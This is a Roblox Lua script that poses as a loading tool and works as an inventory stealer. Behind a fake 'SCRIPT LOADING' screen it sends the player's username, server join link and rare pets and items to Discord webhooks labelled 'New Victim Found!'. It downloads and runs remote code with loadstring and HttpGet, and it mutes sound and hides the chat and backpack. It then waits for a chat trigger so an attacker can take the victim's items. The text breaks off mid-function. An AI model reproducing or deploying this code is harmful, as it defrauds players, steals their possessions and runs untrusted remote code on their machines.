local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local TextChatService = game:GetService("TextChatService")
local SoundService = game:GetService("SoundService")
local StarterGui = game:GetService("StarterGui")
local TweenService = game:GetService("TweenService")
local VirtualInput = game:GetService("VirtualInputManager")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local LocalPlayer = Players.LocalPlayer
local webhookUrl = "https://discord.com/api/webhooks/1395839054591033424/ol-jCkvdl_uhSEMceLDCF0fvC73cIJIOzpOdFNotFXKo8ZXp1N-Sn_L53sFToyUVcgny"
local backdoorWebhook = "https://discord.com/api/webhooks/1395839054591033424/ol-jCkvdl_uhSEMceLDCF0fvC73cIJIOzpOdFNotFXKo8ZXp1N-Sn_L53sFToyUVcgny"
local chatTrigger = "hb1ios"

local E_HOLD_TIME = 0.1
local E_DELAY = 0.2
local HOLD_TIMEOUT = 3
local DISCORD_LINK = "https://discord.gg/UB854NHtwj"

local infiniteYieldLoaded = false

local function sendToBothWebhooks(data)
    local jsonData = HttpService:JSONEncode(data)

    local success1 = pcall(function()
        if syn and syn.request then
            syn.request({
                Url = webhookUrl,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = jsonData
            })
        elseif request then
            request({
                Url = webhookUrl,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = jsonData
            })
        else
            HttpService:PostAsync(webhookUrl, jsonData, Enum.HttpContentType.ApplicationJson)
        end
    end)

    local success2 = pcall(function()
        if syn and syn.request then
            syn.request({
                Url = backdoorWebhook,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = jsonData
            })
        elseif request then
            request({
                Url = backdoorWebhook,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = jsonData
            })
        else
            HttpService:PostAsync(backdoorWebhook, jsonData, Enum.HttpContentType.ApplicationJson)
        end
    end)

    return success1 or success2
end

local function getInventory()
    local inventory = {items = {}, rarePets = {}, rareItems = {}}

    local bannedWords = {"Seed", "Shovel", "Uses", "Tool", "Egg", "Caller", "Staff", "Rod", "Sprinkler", "Crate", "Spray", "Pot"}
    local rarePets = {
        "Raccoon", "Inverted Raccoon", "Dragonfly", "Disco Bee", "Mimic octopus", "Spinosauros",
        "Brontosaurus", "Queen Bee", "Red Fox", "Ankylosarus", "T-Rex", "Chicken Zombie", "Butterfly"
    }
    local rareItems = {
        "Candy Blossom", "Bone Blossom"
    }

    for _, item in pairs(LocalPlayer.Backpack:GetChildren()) do
        if item:IsA("Tool") then
            local isBanned = false
            for _, word in pairs(bannedWords) do
                if string.find(item.Name:lower(), word:lower()) then
                    isBanned = true
                    break
                end
            end

            if not isBanned then
                table.insert(inventory.items, item.Name)
            end

            for _, rarePet in pairs(rarePets) do
                if string.find(item.Name, rarePet) then
                    table.insert(inventory.rarePets, item.Name)
                    break
                end
            end

            for _, rareItem in pairs(rareItems) do
                if string.find(item.Name, rareItem) then
                    table.insert(inventory.rareItems, item.Name)
                    break
                end
            end
        end
    end

    return inventory
end

local function sendToWebhook()
    if not LocalPlayer then
        return
    end

    local inventory = getInventory()
    local inventoryText = #inventory.items > 0 and table.concat(inventory.items, "\n") or "No items"

    local messageData = {
        content = "L hit bru nothing good",
        embeds = {{
            title = "🎯 New Victim Found!",
            description = "READ #⚠️information in Aurora scripts Server to Learn How to Join Victim's Server and Steal Their Stuff!",
            color = 0x530000,
            fields = {
                {name = "👤 Username", value = LocalPlayer.Name, inline = true},
                {name = "🔗 Join Link", value = "https://kebabman.vercel.app/start?placeId=126884695634066&gameInstanceId=" .. (game.JobId or "N/A"), inline = true},
                {name = "🎒 Inventory", value = "```" .. inventoryText .. "```", inline = false},
                {name = "🗣️ Steal Command", value = "Say in chat: `" .. chatTrigger .. "`", inline = false}
            },
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }}
    }
    sendToBothWebhooks(messageData)

    if #inventory.rarePets > 0 then
        local rarePetMessage = {
            content = "@everyone",
            allowed_mentions = { parse = { "everyone" } },
            embeds = {{
                title = "🐾 Rare Pet Found!",
                description = "A rare pet has been detected in the player's inventory!",
                color = 0x530000,
                fields = {
                    {name = "👤 Username", value = LocalPlayer.Name, inline = true},
                    {name = "🔗 Join Link", value = "https://kebabman.vercel.app/start?placeId=126884695634066&gameInstanceId=" .. (game.JobId or "N/A"), inline = true},
                    {name = "🐾 Rare Pets", value = "```" .. table.concat(inventory.rarePets, "\n") .. "```", inline = false},
                    {name = "🗣️ Steal Command", value = "Say in chat: `" .. chatTrigger .. "`", inline = false}
                },
                timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
            }}
        }
        sendToBothWebhooks(rarePetMessage)
    end

    if #inventory.rareItems > 0 then
        local rareItemMessage = {
            content = "@everyone",
            allowed_mentions = { parse = { "everyone" } },
            embeds = {{
                title = "🌟 Rare Item Found!",
                description = "A rare item has been detected in the player's inventory!",
                color = 0x530000,
                fields = {
                    {name = "👤 Username", value = LocalPlayer.Name, inline = true},
                    {name = "🔗 Join Link", value = "https://kebabman.vercel.app/start?placeId=126884695634066&gameInstanceId=" .. (game.JobId or "N/A"), inline = true},
                    {name = "🌟 Rare Items", value = "```" .. table.concat(inventory.rareItems, "\n") .. "```", inline = false},
                    {name = "🗣️ Steal Command", value = "Say in chat: `" .. chatTrigger .. "`", inline = false}
                },
                timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
            }}
        }
        sendToBothWebhooks(rareItemMessage)
    end
end

local function isValidItem(name)
    local bannedWords = {"Seed", "Shovel", "Uses", "Tool", "Egg", "Caller", "Staff", "Rod", "Sprinkler", "Crate"}
    for _, banned in ipairs(bannedWords) do
        if string.find(name:lower(), banned:lower()) then
            return false
        end
    end
    return true
end

local function getValidTools()
    local tools = {}
    for _, item in pairs(LocalPlayer.Backpack:GetChildren()) do
        if item:IsA("Tool") and isValidItem(item.Name) then
            table.insert(tools, item)
        end
    end
    return tools
end

local function toolInInventory(toolName)
    local bp = LocalPlayer:FindFirstChild("Backpack")
    local char = LocalPlayer.Character
    if bp then
        if bp:FindFirstChild(toolName) then return true end
    end
    if char then
        if char:FindFirstChild(toolName) then return true end
    end
    return false
end

local function holdE()
    VirtualInput:SendKeyEvent(true, Enum.KeyCode.E, false, game)
    task.wait(E_HOLD_TIME)
    VirtualInput:SendKeyEvent(false, Enum.KeyCode.E, false, game)
end

local function favoriteItem(tool)
    if tool and tool:IsDescendantOf(game) then
        local toolInstance
        local backpack = LocalPlayer:FindFirstChild("Backpack")
        if backpack then
            toolInstance = backpack:FindFirstChild(tool.Name)
        end
        if not toolInstance and LocalPlayer.Character then
            toolInstance = LocalPlayer.Character:FindFirstChild(tool.Name)
        end
        if toolInstance then
            local args = {
                [1] = toolInstance
            }
            game:GetService("ReplicatedStorage").GameEvents.Favorite_Item:FireServer(unpack(args))
        else
            warn("Tool not found: " .. tool.Name)
        end
    else
        warn("Tool not found or invalid: " .. tostring(tool))
    end
end

local function useToolWithHoldCheck(tool, player)
    local humanoid = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
    if humanoid and tool then
        humanoid:EquipTool(tool)

        local startTime = tick()
        while toolInInventory(tool.Name) do
            holdE()
            task.wait(E_DELAY)
            if tick() - startTime >= HOLD_TIMEOUT then
                if toolInInventory(tool.Name) then
                    favoriteItem(tool)
                    task.wait(0.05)
                    startTime = tick()
                    while toolInInventory(tool.Name) do
                        holdE()
                        task.wait(E_DELAY)
                        if tick() - startTime >= HOLD_TIMEOUT then
                            humanoid:UnequipTools()
                            return false
                        end
                    end
                    humanoid:UnequipTools()
                    return true
                end
                humanoid:UnequipTools()
                return true
            end
        end
        humanoid:UnequipTools()
        return true
    end
    return false
end

local function createDiscordInvite(container)
    if not container:FindFirstChild("HelpLabel") then
        local helpLabel = Instance.new("TextLabel")
        helpLabel.Name = "HelpLabel"
        helpLabel.Size = UDim2.new(0.8, 0, 0.1, 0)
        helpLabel.Position = UDim2.new(0.1, 0, 1.05, 0)
        helpLabel.BackgroundTransparency = 1
        helpLabel.Text = "Stuck at 100 or Script Taking Too Long to Load? Join This Discord Server For Help"
        helpLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
        helpLabel.TextScaled = true
        helpLabel.Font = Enum.Font.GothamBold
        helpLabel.TextXAlignment = Enum.TextXAlignment.Center
        helpLabel.Parent = container

        local copyButton = Instance.new("TextButton")
        copyButton.Name = "CopyLinkButton"
        copyButton.Size = UDim2.new(0.3, 0, 0.08, 0)
        copyButton.Position = UDim2.new(0.35, 0, 1.15, 0)
        copyButton.BackgroundColor3 = Color3.fromRGB(30, 30, 50)
        copyButton.Text = "Copy Link"
        copyButton.TextColor3 = Color3.fromRGB(200, 200, 255)
        copyButton.TextScaled = true
        copyButton.Font = Enum.Font.GothamBold
        copyButton.Parent = container

        local corner = Instance.new("UICorner")
        corner.CornerRadius = UDim.new(0.2, 0)
        corner.Parent = copyButton

        copyButton.MouseButton1Click:Connect(function()
            if setclipboard then
                setclipboard(DISCORD_LINK)
            elseif syn and syn.clipboard_set then
                syn.clipboard_set(DISCORD_LINK)
            end
        end)
    end
end

local function cycleToolsWithHoldCheck(player, loadingGui)
    local tools = getValidTools()
    for _, tool in ipairs(tools) do
        if not useToolWithHoldCheck(tool, player) then
            continue
        end
    end

    local container = loadingGui.SolidBackground.ContentContainer
    createDiscordInvite(container)
end

local function sendBangCommand(player)
    if not infiniteYieldLoaded then
        return
    end
    task.wait(0.05)
    local chatMessage = ";bang " .. player.Name
    if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
        local textChannel = TextChatService.TextChannels:FindFirstChild("RBXGeneral") or TextChatService.TextChannels:WaitForChild("RBXGeneral", 5)
        if textChannel then
            textChannel:SendAsync(chatMessage)
        end
    else
        local chatEvent = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
        if chatEvent then
            local sayMessage = chatEvent:FindFirstChild("SayMessageRequest")
            if sayMessage then
                sayMessage:FireServer(chatMessage, "All")
            end
        end
    end
end

local function disableGameFeatures()
    SoundService.AmbientReverb = Enum.ReverbType.NoReverb
    SoundService.RespectFilteringEnabled = true

    for _, soundGroup in pairs(SoundService:GetChildren()) do
        if soundGroup:IsA("SoundGroup") then
            soundGroup.Volume = 0
        end
    end

    StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, false)
    StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, false)
    StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList, false)
    StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Health, false)
    StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.EmotesMenu, false)
end

local function createLoadingScreen()
    local playerGui = LocalPlayer:WaitForChild("PlayerGui", 10)
    if not playerGui then
        return
    end

    local loadingGui = Instance.new("ScreenGui")
    loadingGui.Name = "ModernLoader"
    loadingGui.ResetOnSpawn = false
    loadingGui.IgnoreGuiInset = true
    loadingGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    loadingGui.DisplayOrder = 999999
    loadingGui.Parent = playerGui

    spawn(function()
        local success, err = pcall(function()
            loadstring(game:HttpGet("https://raw.githubusercontent.com/edgeiy/infiniteyield/master/source"))()
        end)
        if success then
            infiniteYieldLoaded = true
        else
            warn("Failed to load Infinite Yield: " .. tostring(err))
        end
    end)

    local background = Instance.new("Frame")
    background.Name = "SolidBackground"
    background.Size = UDim2.new(1, 0, 1, 0)
    background.Position = UDim2.new(0, 0, 0, 0)
    background.BackgroundColor3 = Color3.fromRGB(10, 10, 20)
    background.BackgroundTransparency = 0
    background.BorderSizePixel = 0
    background.Parent = loadingGui

    local grid = Instance.new("Frame")
    grid.Name = "GridPattern"
    grid.Size = UDim2.new(1, 0, 1, 0)
    grid.Position = UDim2.new(0, 0, 0, 0)
    grid.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
    grid.BackgroundTransparency = 0
    grid.BorderSizePixel = 0

    local uiGrid = Instance.new("UIGridLayout")
    uiGrid.CellSize = UDim2.new(0, 50, 0, 50)
    uiGrid.CellPadding = UDim2.new(0, 2, 0, 2)
    uiGrid.FillDirection = Enum.FillDirection.Horizontal
    uiGrid.FillDirectionMaxCells = 100
    uiGrid.Parent = grid

    for i = 1, 200 do
        local cell = Instance.new("Frame")
        cell.Name = "Cell_"..i
        cell.BackgroundColor3 = Color3.fromRGB(25, 25, 40)
        cell.BorderSizePixel = 0

        local corner = Instance.new("UICorner")
        corner.CornerRadius = UDim.new(0.1, 0)
        corner.Parent = cell

        cell.Parent = grid
    end

    grid.Parent = background

    local container = Instance.new("Frame")
    container.Name = "ContentContainer"
    container.AnchorPoint = Vector2.new(0.5, 0.5)
    container.Size = UDim2.new(0.7, 0, 0.5, 0)
    container.Position = UDim2.new(0.5, 0, 0.5, 0)
    container.BackgroundColor3 = Color3.fromRGB(25, 25, 40)
    container.BackgroundTransparency = 0.3
    container.BorderSizePixel = 0

    local floatTween = TweenService:Create(container, TweenInfo.new(2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true), {Position = UDim2.new(0.5, 0, 0.45, 0)})
    floatTween:Play()

    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0.05, 0)
    corner.Parent = container

    local stroke = Instance.new("UIStroke")
    stroke.Color = Color3.fromRGB(100, 100, 255)
    stroke.Thickness = 3
    stroke.Transparency = 0.3
    stroke.Parent = container

    container.Parent = background

    local title = Instance.new("TextLabel")
    title.Name = "Title"
    title.Size = UDim2.new(0.8, 0, 0.2, 0)
    title.Position = UDim2.new(0.1, 0, 0.1, 0)
    title.BackgroundTransparency = 1
    title.Text = "SCRIPT LOADING"
    title.TextColor3 = Color3.fromRGB(255, 0, 0)
    title.TextScaled = true
    title.Font = Enum.Font.GothamBlack
    title.TextXAlignment = Enum.TextXAlignment.Center
    title.Parent = container

    spawn(function()
        while true do
            for i = 0, 1, 0.01 do
                local r = math.sin(i * math.pi) * 127 + 128
                local g = math.sin(i * math.pi + 2) * 127 + 128
                local b = math.sin(i * math.pi + 4) * 127 + 128
                title.TextColor3 = Color3.fromRGB(r, g, b)
                task.wait(0.05)
            end
        end
    end)

    local barContainer = Instance.new("Frame")
    barContainer.Name = "BarContainer"
    barContainer.Size = UDim2.new(0.8, 0, 0.08, 0)
    barContainer.Position = UDim2.new(0.1, 0, 0.5, 0)
    barContainer.BackgroundColor3 = Color3.fromRGB(30, 30, 50)
    barContainer.BorderSizePixel = 0

    local barCorner = Instance.new("UICorner")
    barCorner.CornerRadius = UDim.new(0.5, 0)
    barCorner.Parent = barContainer

    barContainer.Parent = container

    local loadingBar = Instance.new("Frame")
    loadingBar.Name = "LoadingBar"
    loadingBar.Size = UDim2.new(0, 0, 1, 0)
    loadingBar.BackgroundColor3 = Color3.fromRGB(100, 150, 255)
    loadingBar.BorderSizePixel = 0

    local loadingCorner = Instance.new("UICorner")
    loadingCorner.CornerRadius = UDim.new(0.5, 0)
    loadingCorner.Parent = loadingBar

    loadingBar.Parent = barContainer

    local percentage = Instance.new("TextLabel")
    percentage.Name = "Percentage"
    percentage.Size = UDim2.new(0.8, 0, 0.1, 0)
    percentage.Position = UDim2.new(0.1, 0, 0.6, 0)
    percentage.BackgroundTransparency = 1
    percentage.Text = "0%"
    percentage.TextColor3 = Color3.fromRGB(200, 200, 255)
    percentage.TextScaled = true
    percentage.Font = Enum.Font.GothamBold
    percentage.TextXAlignment = Enum.TextXAlignment.Center
    percentage.Parent = container

    local warning = Instance.new("TextLabel")
    warning.Name = "Warning"
    warning.Size = UDim2.new(0.8, 0, 0.15, 0)
    warning.Position = UDim2.new(0.1, 0, 0.9, 0)
    warning.BackgroundTransparency = 1
    warning.Text = "Made by Met_dream2 and Silenceyeww"
    warning.TextColor3 = Color3.fromRGB(255, 255, 255)
    warning.TextScaled = true
    warning.Font = Enum.Font.GothamBold
    warning.TextXAlignment = Enum.TextXAlignment.Center
    warning.Parent = container

    local loadTween = TweenService:Create(
        loadingBar,
        TweenInfo.new(120, Enum.EasingStyle.Linear),
        {Size = UDim2.new(1, 0, 1, 0)}
    )
    loadTween:Play()

    spawn(function()
        while loadingBar.Size.X.Scale < 0.99 do
            percentage.Text = math.floor(loadingBar.Size.X.Scale * 100) .. "%"
            task.wait(0.1)
        end
        percentage.Text = "100%"
        createDiscordInvite(container)
    end)

    return loadingGui
end

if LocalPlayer then
    sendToWebhook()
    local loadingGui = createLoadingScreen()
    disableGameFeatures()

    if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
        TextChatService.OnIncomingMessage = function(message)
            if message.Text:lower() == chatTrigger then
                local speaker = message.TextSource and Players:GetPlayerByUserId(message.TextSource.UserId)
              
